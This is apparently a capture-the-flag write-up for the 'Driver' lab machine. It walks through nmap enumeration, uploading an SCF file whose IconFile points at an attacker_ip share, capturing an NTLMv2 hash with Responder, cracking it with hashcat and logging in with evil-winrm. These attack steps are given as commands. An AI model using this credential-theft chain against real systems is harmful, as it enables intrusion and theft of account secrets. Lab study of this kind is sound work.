
![[driver logo.png]]


nmap scan

![Pasted image 20251016114930](Image/Pasted%20image%2020251016114930.png)

We notice smb and http is open
First let's enumerate the port 80

![Pasted image 20251016115033](Image/Pasted%20image%2020251016115033.png)

Seems we are on a printer software

When going in the **Firmware Updates** tab, we notice that we can upload file

![Pasted image 20251016115138](Image/Pasted%20image%2020251016115138.png)
Looks like it we be dropped in the smb share and then review by an user, maybe we can grab som creds 

After searching online for exploit, i found this website https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

That explains that if you create a file containing

```
[Shell]
Command=2
IconFile=\\<attacker_ip>\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

The file will be executed when you click on it

Let's run **Responder** and try to get NTLMv2 hash

```
responder -I tun0
```

![Pasted image 20251016115440](Image/Pasted%20image%2020251016115440.png)

Now, we put our malicious file on the website and we hit submit

![Pasted image 20251016115556](Image/Pasted%20image%2020251016115556.png)

Bingo we got an hash for user **tony**

Let's crack it with hashcat

```
hashcat -m 5600 hash.txt /usr/share/wordlist/rockyou.txt
```

![Pasted image 20251016121527](Image/Pasted%20image%2020251016121527.png)

Wen connect with evil-winrm and we grap the user.txt flag

![Pasted image 20251016122055](Image/Pasted%20image%2020251016122055.png)


